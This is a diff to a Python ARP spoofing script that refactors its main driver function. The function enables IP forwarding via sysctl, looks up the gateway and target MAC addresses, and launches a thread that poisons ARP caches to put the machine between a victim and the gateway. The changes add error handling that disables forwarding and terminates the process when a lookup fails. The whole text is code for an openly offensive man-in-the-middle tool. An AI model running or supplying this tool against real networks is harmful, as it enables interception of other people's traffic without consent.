@@ -43,41 +43,44 @@ def arp_spoof(gateway_ip, gateway_mac, target_ip, target_mac):
         restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
 
 def spoof_thread():
-    args = get_option()
-    gateway_ip = str(args.g)
-    target_ip = str(args.t)
-    # Disable progress display.
-    conf.verb = 0
+    try:
+        args = get_option()
+        gateway_ip = str(args.g)
+        target_ip = str(args.t)
+        # Disable progress display.
+        conf.verb = 0
 
-    #Start the script
-    print('Starting script: arp_spoof.py')
-    print('Enabling IP forwarding')
-    #Enable IP Forwarding on a mac
-    os.system('sysctl -w net.inet.ip.forwarding=1')
-    print('Gateway IP address: ' + gateway_ip)
-    print('Target IP address: ' + target_ip)
+        #Start the script
+        print('Starting script: arp_spoof.py')
+        print('Enabling IP forwarding')
+        #Enable IP Forwarding on a mac
+        os.system('sysctl -w net.inet.ip.forwarding=1')
+        print('Gateway IP address: ' + gateway_ip)
+        print('Target IP address: ' + target_ip)
 
-    gateway_mac = get_mac(gateway_ip)
-    if gateway_mac is None:
-        print('[!] Unable to get gateway MAC address. Exiting..')
-        sys.exit(0)
-    else:
-        print('Gateway MAC address: ' + gateway_mac)
+        gateway_mac = get_mac(gateway_ip)
+        if gateway_mac is None:
+            print('[!] Unable to get gateway MAC address. Exiting..')
+            os.system('sysctl -w net.inet.ip.forwarding=0')
+            os.kill(os.getpid(), signal.SIGTERM)
+            sys.exit(0)
+        else:
+            print('Gateway MAC address: ' + gateway_mac)
 
-    target_mac = get_mac(target_ip)
-    if target_mac is None:
-        print('[!] Unable to get target MAC address. Exiting..')
-        sys.exit(0)
-    else:
-        print('Target MAC address: ' + target_mac)
+        target_mac = get_mac(target_ip)
+        if target_mac is None:
+            print('[!] Unable to get target MAC address. Exiting..')
+            os.system('sysctl -w net.inet.ip.forwarding=0')
+            os.kill(os.getpid(), signal.SIGTERM)
+            sys.exit(0)
+        else:
+            print('Target MAC address: ' + target_mac)
 
     #ARP spoofing thread
-    try:
         spoof_thread = threading.Thread(target=arp_spoof, args=(gateway_ip, gateway_mac, target_ip, target_mac))
         spoof_thread.daemon = True
         spoof_thread.start()
         print('Start arp spoofing')
-        while True: time.sleep(10)
 
     except KeyboardInterrupt:
         print('\nStopping network capture..Restoring network')
